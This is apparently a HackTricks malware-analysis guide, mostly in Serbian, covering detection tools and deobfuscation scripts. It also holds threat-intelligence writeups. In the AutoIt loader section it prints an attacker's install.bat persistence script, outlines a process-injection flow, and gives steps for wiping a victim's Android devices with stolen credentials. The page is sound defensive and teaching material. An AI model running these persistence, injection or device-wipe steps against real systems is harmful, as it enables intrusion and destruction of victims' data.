# Analiza malvera

{{#include ../../banners/hacktricks-training.md}}

## Forenzički CheatSheets

[https://www.jaiminton.com/cheatsheet/DFIR/#](https://www.jaiminton.com/cheatsheet/DFIR/)

## Online servisi

- [VirusTotal](https://www.virustotal.com/gui/home/upload)
- [HybridAnalysis](https://www.hybrid-analysis.com)
- [Koodous](https://koodous.com)
- [Intezer](https://analyze.intezer.com)
- [Any.Run](https://any.run/)

## Offline antivirus i alati za detekciju

### Yara

#### Instalacija
```bash
sudo apt-get install -y yara
```
#### Pripremite pravila

Koristite ovaj skript da preuzmete i spojite sve yara malware rules sa github-a: [https://gist.github.com/andreafortuna/29c6ea48adf3d45a979a78763cdc7ce9](https://gist.github.com/andreafortuna/29c6ea48adf3d45a979a78763cdc7ce9)\
Kreirajte direktorijum _**rules**_ i pokrenite skript. Ovo će kreirati fajl pod nazivom _**malware_rules.yar**_ koji sadrži sve yara rules za malware.
```bash
wget https://gist.githubusercontent.com/andreafortuna/29c6ea48adf3d45a979a78763cdc7ce9/raw/4ec711d37f1b428b63bed1f786b26a0654aa2f31/malware_yara_rules.py
mkdir rules
python malware_yara_rules.py
```
#### Skeniranje
```bash
yara -w malware_rules.yar image  #Scan 1 file
yara -w malware_rules.yar folder #Scan the whole folder
```
#### YaraGen: Provera malware-a i kreiranje pravila

Možete koristiti alat [**YaraGen**](https://github.com/Neo23x0/yarGen) za generisanje yara pravila iz binarnog fajla. Pogledajte ove tutorijale: [**Part 1**](https://www.nextron-systems.com/2015/02/16/write-simple-sound-yara-rules/), [**Part 2**](https://www.nextron-systems.com/2015/10/17/how-to-write-simple-but-sound-yara-rules-part-2/), [**Part 3**](https://www.nextron-systems.com/2016/04/15/how-to-write-simple-but-sound-yara-rules-part-3/)
```bash
python3 yarGen.py --update
python3.exe yarGen.py --excludegood -m  ../../mals/
```
### ClamAV

#### Instalacija
```
sudo apt-get install -y clamav
```
#### Skeniranje
```bash
sudo freshclam      #Update rules
clamscan filepath   #Scan 1 file
clamscan folderpath #Scan the whole folder
```
### [Capa](https://github.com/mandiant/capa)

**Capa** otkriva potencijalno maliciozne **sposobnosti** u izvršnim fajlovima: PE, ELF, .NET. Dakle pronaći će stvari kao što su Att\&ck taktike, ili sumnjive sposobnosti kao što su:

- proveri OutputDebugString grešku
- pokreni kao servis
- kreiraj proces

Preuzmi ga u [**Github repo**](https://github.com/mandiant/capa).

### IOCs

IOC znači Indicator Of Compromise. IOC je skup **uslova koji identifikuju** neki potencijalno neželjeni softver ili potvrđeni **malware**. Blue Teams koriste ovu vrstu definicije da bi **pretražili ovu vrstu malicioznih fajlova** u svojim **sistemima** i **mrežama**.\
Deljenje ovih definicija je veoma korisno, jer kada se malware identifikuje na računaru i kreira IOC za taj malware, druge Blue Teams mogu koristiti to da brže identifikuju malware.

Alat za kreiranje ili izmenu IOCs je [**IOC Editor**](https://www.fireeye.com/services/freeware/ioc-editor.html)**.**\
Možete koristiti alate kao što su [**Redline**](https://www.fireeye.com/services/freeware/redline.html) da **pretražite definisane IOCs u uređaju**.

### Loki

[**Loki**](https://github.com/Neo23x0/Loki) je skener za Simple Indicators of Compromise.\
Detekcija se zasniva na četiri metode detekcije:
```
1. File Name IOC
Regex match on full file path/name

2. Yara Rule Check
Yara signature matches on file data and process memory

3. Hash Check
Compares known malicious hashes (MD5, SHA1, SHA256) with scanned files

4. C2 Back Connect Check
Compares process connection endpoints with C2 IOCs (new since version v.10)
```
### Linux Malware Detect

[**Linux Malware Detect (LMD)**](https://www.rfxn.com/projects/linux-malware-detect/) je skener malvera za Linux objavljen pod GNU GPLv2 licencom, dizajniran za pretnje prisutne u okruženjima deljenog hostinga. Koristi podatke o pretnjama iz sistema za detekciju upada na mrežnoj ivici (network edge intrusion detection systems) da izvuče malver koji se aktivno koristi u napadima i generiše potpise za detekciju. Pored toga, podaci o pretnjama se takođe dobijaju iz korisničkih prijava pomoću LMD checkout feature i iz malware community resources.

### rkhunter

Alati poput [**rkhunter**](http://rkhunter.sourceforge.net) mogu se koristiti za proveru fajl sistema u potrazi za mogućim **rootkits** i malverom.
```bash
sudo ./rkhunter --check -r / -l /tmp/rkhunter.log [--report-warnings-only] [--skip-keypress]
```
### FLOSS

[**FLOSS**](https://github.com/mandiant/flare-floss) je alat koji pokušava da pronađe obfuskovane stringove unutar izvršnih datoteka koristeći različite tehnike.

### PEpper

[PEpper ](https://github.com/Th3Hurrican3/PEpper)proverava osnovne stvari unutar izvršne datoteke (binarne podatke, entropiju, URLs i IPs, some yara rules).

### PEstudio

[PEstudio](https://www.winitor.com/download) je alat koji omogućava dobijanje informacija o Windows izvršnim fajlovima kao što su imports, exports, headers, ali će takođe proveriti virus total i pronaći potencijalne Att\&ck tehnike.

### Detect It Easy(DiE)

[**DiE**](https://github.com/horsicq/Detect-It-Easy/) je alat za detekciju da li je fajl **šifrovan** i takođe pronalaženje **packers**.

### NeoPI

[**NeoPI** ](https://github.com/CiscoCXSecurity/NeoPI)is a Python script that uses a variety of **statističke metode** to detect **obfuskovan** and **šifrovan** content within text/script files. The intended purpose of NeoPI is to aid in the **otkrivanju skrivenog web shell koda**.

### **php-malware-finder**

[**PHP-malware-finder**](https://github.com/nbs-system/php-malware-finder) radi sve što može da detektuje **obfuskovan**/**sumnjiv kod** kao i fajlove koji koriste **PHP** funkcije često korišćene u **malwares**/webshells.

### Apple Binary Signatures

When checking some **malware sample** you should always **check the signature** of the binary as the **developer** that signed it may be already **related** with **malware.**
```bash
#Get signer
codesign -vv -d /bin/ls 2>&1 | grep -E "Authority|TeamIdentifier"

#Check if the app’s contents have been modified
codesign --verify --verbose /Applications/Safari.app

#Check if the signature is valid
spctl --assess --verbose /Applications/Safari.app
```
## Tehnike detekcije

### Nagomilavanje fajlova

Ako znate da je neka fascikla koja sadrži **fajlove** web servera bila **poslednji put ažurirana na neki datum**, **proverite** datum kada su svi **fajlovi** na **web serveru** kreirani i modifikovani, i ako je neki datum **sumnjiv**, proverite taj fajl.

### Osnovne referentne vrednosti

Ako fajlovi u fascikli **ne bi smeli da budu izmenjeni**, možete izračunati **hash** originalnih fajlova fascikle i **uporediti** ih sa trenutnim. Sve što je izmenjeno biće **sumnjivo**.

### Statistička analiza

Kada se informacije čuvaju u logovima, možete **proveriti statistiku**, na primer koliko puta je svaki fajl na web serveru bio pristupan — web shell može biti među najčešće pristupanima.

---

### Native telemetrija unutar Android aplikacije (bez root-a)

Na Androidu možete instrumentovati native kod unutar procesa ciljne aplikacije tako što ćete unapred učitati malu biblioteku za logovanje pre nego što se druge JNI biblioteke inicijalizuju. To daje ranu vidljivost native ponašanja bez sistemskih hook-ova ili root-a. Popularan pristup je SoTap: ubacite libsotap.so za odgovarajući ABI u APK i ubacite poziv System.loadLibrary("sotap") rano (npr. statički inicijalizator ili Application.onCreate), a zatim prikupljajte logove iz internog/eksternog puta ili kao fallback iz Logcat-a.

Pogledajte stranicu o Android native reversing za detalje podešavanja i puteve do logova:

{{#ref}}
../../mobile-pentesting/android-app-pentesting/reversing-native-libraries.md
{{#endref}}

---

### Android/JNI native string deobfuscation with angr + Ghidra

Neki Android malveri i RASP-zaštićene aplikacije skrivaju JNI imena metoda i signaturne tako što ih dekoduju u runtime-u pre poziva RegisterNatives. Kada Frida/ptrace instrumentacija bude ubijena od strane anti-debug mehanizama, i dalje možete povratiti prosti tekst offline izvršavanjem dekodera u binarnom fajlu pomoću angr i potom ubaciti rezultate natrag u Ghidra kao komentare.

Ključna ideja: tretirajte dekoder unutar .so kao pozivu funkciju, izvršite ga nad obfuskovanim bajt-blobovima u .rodata i konkretizujte izlazne bajtove sve do prvog \x00 (C-string terminator). Obezbedite da angr i Ghidra koriste istu image base kako biste izbegli neusaglašenost adresa.

Pregled toka rada
- Triage u Ghidra: identifikujte dekoder i njegovu konvenciju poziva/argumente u JNI_OnLoad i RegisterNatives setup-u.
- Pokrenite angr (CPython3) da izvršite dekoder za svaki ciljni string i ispišete rezultate.
- Annotirajte u Ghidra: automatski dodajte komentare sa dekodovanim stringovima na svakom mestu poziva za brzu rekonstrukciju JNI.

Ghidra trijaža (JNI_OnLoad obrazac)
- Primeni JNI tipove podataka na JNI_OnLoad tako da Ghidra prepoznaje JNINativeMethod strukture.
- Tipičan JNINativeMethod po Oracle dokumentaciji:

```c
typedef struct {
char *name;      // e.g., "nativeFoo"
char *signature; // e.g., "()V", "()[B"
void *fnPtr;     // native implementation address
} JNINativeMethod;
```
- Potražite pozive ka RegisterNatives. Ako biblioteka konstruše ime/signaturu pomoću lokalne rutine (npr. FUN_00100e10) koja referencira statičnu tabelu bajtova (npr. DAT_00100bf4) i prima parametre poput (encoded_ptr, out_buf, length), to je idealan cilj za offline izvršavanje.

angr podešavanje (izvršavanje dekodera offline)
- Učitajte .so sa istom bazom koja se koristi u Ghidra (primer: 0x00100000) i onemogućite automatsko učitavanje eksternih biblioteka da biste držali stanje malim.

<details>
<summary>angr podešavanje i offline izvršavanje dekodera</summary>
```python
import angr, json

project = angr.Project(
'/path/to/libtarget.so',
load_options={'main_opts': {'base_addr': 0x00100000}},
auto_load_libs=False,
)

ENCODING_FUNC_ADDR = 0x00100e10  # decoder function discovered in Ghidra

def decode_string(enc_addr, length):
# fresh blank state per evaluation
st = project.factory.blank_state()
outbuf = st.heap.allocate(length)
call = project.factory.callable(ENCODING_FUNC_ADDR, base_state=st)
ret_ptr = call(enc_addr, outbuf, length)  # returns outbuf pointer
rs = call.result_state
raw = rs.solver.eval(rs.memory.load(ret_ptr, length), cast_to=bytes)
return raw.split(b'\x00', 1)[0].decode('utf-8', errors='ignore')

# Example: decode a JNI signature at 0x100933 of length 5 → should be ()[B
print(decode_string(0x00100933, 5))
```
</details>

- Na velikoj skali, izgradite statičku mapu koja povezuje call sites sa decoder’s arguments (encoded_ptr, size). Wrappers mogu sakriti argumente, pa ovo mapiranje možete kreirati ručno iz Ghidra xrefs ako je API recovery nepouzdana.

<details>
<summary>Masovno dekodirajte više call sites pomoću angr</summary>
```python
# call_site -> (encoded_addr, size)
call_site_args_map = {
0x00100f8c: (0x00100b81, 0x41),
0x00100fa8: (0x00100bca, 0x04),
0x00100fcc: (0x001007a0, 0x41),
0x00100fe8: (0x00100933, 0x05),
0x0010100c: (0x00100c62, 0x41),
0x00101028: (0x00100c15, 0x16),
0x00101050: (0x00100a49, 0x101),
0x00100cf4: (0x00100821, 0x11),
0x00101170: (0x00100940, 0x101),
0x001011cc: (0x0010084e, 0x13),
0x00101334: (0x001007e9, 0x0f),
0x00101478: (0x0010087d, 0x15),
0x001014f8: (0x00100800, 0x19),
0x001015e8: (0x001008e6, 0x27),
0x0010160c: (0x00100c33, 0x13),
}

decoded_map = { hex(cs): decode_string(enc, sz)
for cs, (enc, sz) in call_site_args_map.items() }

import json
print(json.dumps(decoded_map, indent=2))
with open('decoded_strings.json', 'w') as f:
json.dump(decoded_map, f, indent=2)
```
</details>

Anotirajte lokacije poziva u Ghidra
Option A: Jython-only comment writer (use a pre-computed JSON)
- Pošto angr zahteva CPython3, držite deobfuskaciju i anotiranje odvojenim. Prvo pokrenite angr skriptu iznad da generišete decoded_strings.json. Zatim pokrenite ovaj Jython GhidraScript da upišete PRE_COMMENTs na svakoj lokaciji poziva (i uključite ime funkcije koja poziva radi konteksta):

<details>
<summary>Ghidra Jython skripta za anotiranje dekodiranih JNI stringova</summary>
```python
#@category Android/Deobfuscation
# Jython in Ghidra 10/11
import json
from ghidra.program.model.listing import CodeUnit

# Ask for the JSON produced by the angr script
f = askFile('Select decoded_strings.json', 'Load')
mapping = json.load(open(f.absolutePath, 'r'))  # keys as hex strings

fm = currentProgram.getFunctionManager()
rm = currentProgram.getReferenceManager()

# Replace with your decoder address to locate call-xrefs (optional)
ENCODING_FUNC_ADDR = 0x00100e10
enc_addr = toAddr(ENCODING_FUNC_ADDR)

callsite_to_fn = {}
for ref in rm.getReferencesTo(enc_addr):
if ref.getReferenceType().isCall():
from_addr = ref.getFromAddress()
fn = fm.getFunctionContaining(from_addr)
if fn:
callsite_to_fn[from_addr.getOffset()] = fn.getName()

# Write comments from JSON
for k_hex, s in mapping.items():
cs = int(k_hex, 16)
site = toAddr(cs)
caller = callsite_to_fn.get(cs, None)
text = s if caller is None else '%s @ %s' % (s, caller)
currentProgram.getListing().setComment(site, CodeUnit.PRE_COMMENT, text)
print('[+] Annotated %d call sites' % len(mapping))
```
</details>

Opcija B: Jedan CPython skript putem pyhidra/ghidra_bridge
- Alternativno, koristite pyhidra ili ghidra_bridge da pokrenete Ghidra’s API iz iste CPython instance koja koristi angr. Ovo omogućava pozivanje decode_string() i odmah postavljanje PRE_COMMENTs bez privremene datoteke. Logika prati Jython skript: izgradite callsite→function map pomoću ReferenceManager, dekodirajte sa angr, i postavite komentare.

Zašto ovo funkcioniše i kada ga koristiti
- Offline izvršavanje zaobilazi RASP/anti-debug: nema ptrace-a, nema Frida hookova potrebnih za vraćanje stringova.
- Držanje Ghidra i angr base_addr poravnatim (npr. 0x00100000) osigurava da se adrese funkcija/podataka poklapaju između alata.
- Ponavljajući recept za dekodere: posmatrajte transformaciju kao čistu funkciju, alocirajte izlazni buffer u svežem state-u, pozovite je sa (encoded_ptr, out_ptr, len), zatim konkretizujte preko state.solver.eval i parsirajte C-strings do \x00.

Napomene i zamke
- Poštujte ciljnu ABI/calling convention. angr.factory.callable bira jednu na osnovu arch; ako argumenti izgledaju pomereno, navedite cc eksplicitno.
- Ako decoder očekuje nule u izlaznim baferima, inicijalizujte outbuf nulama u state-u pre poziva.
- Za position-independent Android .so, uvek prosledite base_addr kako bi adrese u angr bile iste kao u Ghidra-i.
- Koristite currentProgram.getReferenceManager() da nabrojite call-xrefs čak i ako aplikacija umotava decoder iza tankih stubova.

For angr basics, see: [angr basics](../../reversing/reversing-tools-basic-methods/angr/README.md)

---

## Deobfuskovanje dinamičkog kontrolnog toka (JMP/CALL RAX Dispatchers)

Savremene maliciozne porodice intenzivno zloupotrebljavaju Control-Flow Graph (CFG) obfuscation: umesto direktnog jump/call, destinaciju izračunavaju u runtime-u i izvršavaju `jmp rax` ili `call rax`. Mali *dispatcher* (obično devet instrukcija) postavlja konačno odredište u zavisnosti od CPU `ZF`/`CF` zastavica, potpuno onemogućavajući statičko obnavljanje CFG-a.

Tehniku – koju demonstrira SLOW#TEMPEST loader – može se pobediti trostepenim postupkom koji se oslanja samo na IDAPython i Unicorn CPU emulator.

### 1. Locate every indirect jump / call
```python
import idautils, idc

for ea in idautils.FunctionItems(idc.here()):
mnem = idc.print_insn_mnem(ea)
if mnem in ("jmp", "call") and idc.print_operand(ea, 0) == "rax":
print(f"[+] Dispatcher found @ {ea:X}")
```
### 2. Ekstrahujte dispatcher byte-code
```python
import idc

def get_dispatcher_start(jmp_ea, count=9):
s = jmp_ea
for _ in range(count):
s = idc.prev_head(s, 0)
return s

start = get_dispatcher_start(jmp_ea)
size  = jmp_ea + idc.get_item_size(jmp_ea) - start
code  = idc.get_bytes(start, size)
open(f"{start:X}.bin", "wb").write(code)
```
### 3. Emuliraj to dvaput pomoću Unicorn
```python
from unicorn import *
from unicorn.x86_const import *
import struct

def run(code, zf=0, cf=0):
BASE = 0x1000
mu = Uc(UC_ARCH_X86, UC_MODE_64)
mu.mem_map(BASE, 0x1000)
mu.mem_write(BASE, code)
mu.reg_write(UC_X86_REG_RFLAGS, (zf << 6) | cf)
mu.reg_write(UC_X86_REG_RAX, 0)
mu.emu_start(BASE, BASE+len(code))
return mu.reg_read(UC_X86_REG_RAX)
```
Pokrenite `run(code,0,0)` i `run(code,1,1)` да бисте добили *false* и *true* branch targets.

### 4. Patch back a direct jump / call
```python
import struct, ida_bytes

def patch_direct(ea, target, is_call=False):
op   = 0xE8 if is_call else 0xE9           # CALL rel32 or JMP rel32
disp = target - (ea + 5) & 0xFFFFFFFF
ida_bytes.patch_bytes(ea, bytes([op]) + struct.pack('<I', disp))
```
Nakon zakrpe, primorajte IDA da ponovo analizira funkciju kako bi se vratio kompletan CFG i Hex-Rays izlaz:
```python
import ida_auto, idaapi
idaapi.reanalyze_function(idc.get_func_attr(ea, idc.FUNCATTR_START))
```
### 5. Označavanje indirektnih API poziva

Kada je stvarna destinacija svakog `call rax` utvrđena, možete reći IDA-i šta je to tako da se tipovi parametara i imena promenljivih automatski oporave:
```python
idc.set_callee_name(call_ea, resolved_addr, 0)  # IDA 8.3+
```
### Praktične prednosti

* Vraća stvarni CFG → dekompilacija prelazi sa *10* linija na na hiljade.
* Omogućava string-cross-reference & xrefs, što čini rekonstrukciju ponašanja trivijalnom.
* Skripte su ponovo upotrebljive: ubacite ih u bilo koji loader zaštićen istim trikom.

---

## AutoIt-based loaders: .a3x decryption, Task Scheduler masquerade and RAT injection

Ovaj obrazac upada povezuje potpisani MSI, AutoIt loadere kompajlirane u .a3x, i Task Scheduler job koji se predstavlja kao bezopasna aplikacija.

### MSI → custom actions → AutoIt orchestrator

Stablo procesa i komande koje izvršavaju MSI custom actions:

- MsiExec.exe → cmd.exe da pokrene install.bat
- WScript.exe da prikaže lažni dijalog greške
```cmd
%SystemRoot%\system32\cmd.exe /c %APPDATA%\스트레스 클리어\install.bat
%SystemRoot%\System32\WScript.exe %APPDATA%\스트레스 클리어\error.vbs
```
install.bat (postavlja loader, postavlja persistence, briše tragove):
```bat
@echo off
set dr=Music

copy "%~dp0AutoIt3.exe" %public%\%dr%\AutoIt3.exe
copy "%~dp0IoKlTr.au3" %public%\%dr%\IoKlTr.au3

cd /d %public%\%dr% & copy c:\windows\system32\schtasks.exe hwpviewer.exe ^
& hwpviewer /delete /tn "IoKlTr" /f ^
& hwpviewer /create /sc minute /mo 1 /tn "IoKlTr" /tr "%public%\%dr%\AutoIt3.exe %public%\%dr%\IoKlTr.au3"

del /f /q "%~dp0AutoIt3.exe"
del /f /q "%~dp0IoKlTr.au3"
del /f /q "%~f0"
```
error.vbs (mamac za korisnika):
```vb
MsgBox "현재 시스템 언어팩과 프로그램 언어팩이 호환되지 않아 실행할 수 없습니다." & vbCrLf & _
"설정에서 한국어(대한민국) 언어팩을 설치하거나 변경한 뒤 다시 실행해 주세요.", _
vbCritical, "언어팩 오류"
```
Key artifacts and masquerade:
- Postavlja AutoIt3.exe i IoKlTr.au3 u C:\Users\Public\Music
- Kopira schtasks.exe u hwpviewer.exe (maskira se kao preglednik Hangul Word Processor-a)
- Kreira zakazani zadatak "IoKlTr" koji se izvršava svakog minuta
- Startup LNK viđen kao Smart_Web.lnk; mutex: `Global\AB732E15-D8DD-87A1-7464-CE6698819E701`
- Postavlja module u podfoldere %APPDATA%\Google\Browser\ koji sadrže `adb` ili `adv` i pokreće ih pomoću autoit.vbs/install.bat pomoćnih skripti

Forensic triage tips:
- Enumeracija schtasks: `schtasks /query /fo LIST /v | findstr /i "IoKlTr hwpviewer"`
- Potražite preimenovane kopije schtasks.exe koje se nalaze uz Task XML: `dir /a "C:\Users\Public\Music\hwpviewer.exe"`
- Uobičajeni putevi: `C:\Users\Public\Music\AutoIt3.exe`, `...\IoKlTr.au3`, Startup `Smart_Web.lnk`, `%APPDATA%\Google\Browser\(adb|adv)*`
- Korelirajte kreiranje procesa: AutoIt3.exe pokreće legitimne Windows binarije (npr., cleanmgr.exe, hncfinder.exe)

### AutoIt loaderi i .a3x payload dešifrovanje → injekcija

- AutoIt moduli su kompajlirani sa `#AutoIt3Wrapper_Outfile_type=a3x` i dešifruju ugrađene payload-e pre injektovanja u benigne procese.
- Primećene familije: QuasarRAT (injektovan u hncfinder.exe) i RftRAT/RFTServer (injektovan u cleanmgr.exe), kao i RemcosRAT moduli (`Remcos\RunBinary.a3x`).
- Šablon dešifrovanja: izvede AES ključ preko HMAC-a, dešifruje ugrađeni blob, zatim injektuje plaintext modul.

Generički skelet za dešifrovanje (tačan HMAC input/algoritam zavisi od familije):
```python
import hmac, hashlib
from Crypto.Cipher import AES

def derive_aes_key(secret: bytes, data: bytes) -> bytes:
# Example: HMAC-SHA256 → first 16/32 bytes as AES key
return hmac.new(secret, data, hashlib.sha256).digest()

def aes_decrypt_cbc(key: bytes, iv: bytes, ct: bytes) -> bytes:
return AES.new(key, AES.MODE_CBC, iv=iv).decrypt(ct)
```
Uobičajeni tok injekcije (CreateRemoteThread-style):
- CreateProcess (suspended) ciljnog hosta (npr. cleanmgr.exe)
- VirtualAllocEx + WriteProcessMemory sa dešifrovanim modulom/shellcode-om
- CreateRemoteThread ili QueueUserAPC za izvršenje payload-a

Ideje za detekciju
- AutoIt3.exe pokrenut od strane MsiExec.exe ili WScript.exe koji pokreće sistemske alate
- Fajlovi sa `.a3x` ekstenzijama ili AutoIt script runners u javnim/putanjama u koje korisnik može pisati
- Sumnjivi scheduled tasks koji izvršavaju AutoIt3.exe ili binarne fajlove koje nije potpisao Microsoft, sa okidačima na nivou minuta

### Account-takeover abuse of Android Find My Device (Find Hub)

Tokom Windows intruzije, operatori su koristili ukradene Google kredencijale da više puta brišu Android uređaje žrtve, utišavajući notifikacije dok su širili pristup preko desktop messenger-a na koji je žrtva bila prijavljena.

Operator koraci (iz prijavljene browser sesije):
- Pregledajte Google Account → Security → Your devices; pratite Find My Phone → Find Hub (https://www.google.com/android/find)
- Izaberite uređaj → ponovo unesite Google password → inicirajte "Erase device" (factory reset); ponavljajte da biste odložili oporavak
- Opcionalno: obrišite alert e-mailove u povezanom mailbox-u (npr. Naver) da biste sakrili bezbednosna obaveštenja

## Tracing heavily obfuscated Node.js loaders

Napadači sve češće pakuju JavaScript loadere unutar samostalnih Windows binarnih fajlova kompajliranih sa [`nexe`](https://github.com/nexe/nexe), tako da runtime stiže zajedno sa skriptom. Nastali PE često ima 60–90 MB i izvršava se čak i ako Node.js nije instaliran. Tokom trijaže:

- Koristite [`nexe_unpacker`](https://npm.io/package/nexe_unpacker) da izrežete ugrađeni JavaScript iz PE i ubacite ga u lokalne alate za statičko poređenje.
- Očekujte mutex zasnovan na disku u `%TEMP%` (GachiLoader ostavlja nasumičan `<name>.lock` fajl koji isteče posle ~5 minuta). Kopiranje fajla u sandbox pre izvršenja omogućava vam da preskočite redundantne faze, a i dalje vidite kasnije payload-ove.

### Node.js API tracing to defeat anti-analysis

Check Point’s [Nodejs-Tracer](https://github.com/CheckPointSW/Nodejs-Tracer) hooks core modules inside any Node.js process, lets you spoof anti-VM probes, and preserves every artifact the sample writes. Launch obfuscated scripts through the tracer to keep analyst-controlled instrumentation in the call stack:
```powershell
node -r .\tracer.js main.js
```
Ključna podešavanja u `tracer.js` omogućavaju vam da:

- Log filesystem, child-process, and HTTP activity (`LOG_HTTP_REQUESTS`, `SAVE_FILE_WRITES`). Svaki ubačeni fajl — kao što je `kidkadi.node` — kopira se u radni direktorijum pre nego što ga malver obriše.
- Override environment fingerprints vraćanjem realističnih RAM/CPU vrednosti, lažiranjem izlaza `tasklist` i manipulisanjem PowerShell/WMI odgovora. Ovo zaobilazi loadere koji zahtevaju ≥4 GB RAM, ≥2 jezgra, i proveravaju korisnička imena (`mashinesssss`, `wdagutilityaccount`, itd.), hostnames (`desktop-vrsqlag`, `server1` …) i imena procesa (`vmtoolsd.exe`, `fiddler.exe`, `x64dbg.exe`, `frida-server.exe`).
- Neuter WMI hardware checks poput `Get-WmiObject Win32_DiskDrive` (tražeći `vmware`, `kvm`, `virtio`, …), `Win32_VideoController` (blokirajući “VirtualBox Graphics Adapter”, “Hyper-V Video”, itd.) i brojanja `Win32_PortConnector`. Kada ti upiti prijave “pravi” hardver, sandboxovi više ne upadaju u beskonačnu petlju benignih `Invoke-WebRequest` poziva ka `linkedin.com`, `grok.com`, `whatsapp.com` i sličnim domenima koje GachiLoader koristi da oduzme vreme analizi.

### Automatsko presretanje gated C2 saobraćaja

Mrežni hookovi tracera otkrivaju višeslojnu C2 autentifikaciju bez reverzovanja JavaScript ofuskacije. U posmatranoj kampanji loader:

1. POSTs host telemetry to `/log` on each hard-coded C2.
2. Issues `GET /richfamily/<per-sample key>` with `X-Secret: gachifamily` to retrieve a Base64-encoded payload URL.
3. Performs a final `GET` to that URL with a long per-sample `X-Secret` header; missing it returns `403 Forbidden`.

Pošto tracer snima kompletne zahteve (headers, bodies, destinations), možete ponovo reproducirati isti saobraćaj da biste preuzeli payload-e, dump-ovali Themida/VMProtect shelove iz memorije i izvukli Rhadamanthys konfiguracione podatke u obimu.

## AdaptixC2: Configuration Extraction and TTPs

Pogledajte posvećenu stranicu:

{{#ref}}
adaptixc2-config-extraction-and-ttps.md
{{#endref}}

## Reference

- [Unit42 – Evolving Tactics of SLOW#TEMPEST: A Deep Dive Into Advanced Malware Techniques](https://unit42.paloaltonetworks.com/slow-tempest-malware-obfuscation/)
- SoTap: Lightweight in-app JNI (.so) behavior logger – [github.com/RezaArbabBot/SoTap](https://github.com/RezaArbabBot/SoTap)
- Strategies for Analyzing Native Code in Android Applications: Combining Ghidra and Symbolic Execution for Code Decryption and Deobfuscation – [revflash.medium.com](https://revflash.medium.com/strategies-for-analyzing-native-code-in-android-applications-combining-ghidra-and-symbolic-aaef4c9555df)
- Ghidra – [github.com/NationalSecurityAgency/ghidra](https://github.com/NationalSecurityAgency/ghidra)
- angr – [angr.io](https://angr.io/)
- JNI_OnLoad and invocation API – [docs.oracle.com](https://docs.oracle.com/javase/8/docs/technotes/guides/jni/spec/invocation.html#JNJI_OnLoad)
- RegisterNatives – [docs.oracle.com](https://docs.oracle.com/javase/8/docs/technotes/guides/jni/spec/functions.html#RegisterNatives)
- Tracing JNI Functions – [valsamaras.medium.com](https://valsamaras.medium.com/tracing-jni-functions-75b04bee7c58)
- Native Enrich: Scripting Ghidra and Frida to discover hidden JNI functions – [laripping.com](https://laripping.com/blog-posts/2021/12/20/nativeenrich.html)
- [Unit42 – AdaptixC2: A New Open-Source Framework Leveraged in Real-World Attacks](https://unit42.paloaltonetworks.com/adaptixc2-post-exploitation-framework/)
- KONNI-linked APT abuses Google Find Hub to wipe Android devices after Windows intrusion – [genians.co.kr](https://www.genians.co.kr/en/blog/threat_intelligence/android)
- Android Find My Device (Find Hub) – [google.com/android/find](https://www.google.com/android/find)
- RftRAT/RFTServer technical analysis – [asec.ahnlab.com](https://asec.ahnlab.com/en/59590/)
- HMAC background – [wikipedia.org/wiki/HMAC](https://en.wikipedia.org/wiki/HMAC)
- [Check Point Research – GachiLoader: Defeating Node.js Malware with API Tracing](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [Nodejs-Tracer – GitHub](https://github.com/CheckPointSW/Nodejs-Tracer)

{{#include ../../banners/hacktricks-training.md}}
